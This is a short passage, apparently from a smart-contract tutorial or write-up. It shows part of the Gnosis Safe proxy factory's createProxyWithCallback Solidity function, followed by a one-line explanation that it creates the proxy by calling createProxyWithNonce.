        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) public returns (GnosisSafeProxy proxy) {
        uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
        proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
        if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
    }
```
This function will calculate the proxy by calling the `createProxyWithNonce`function.
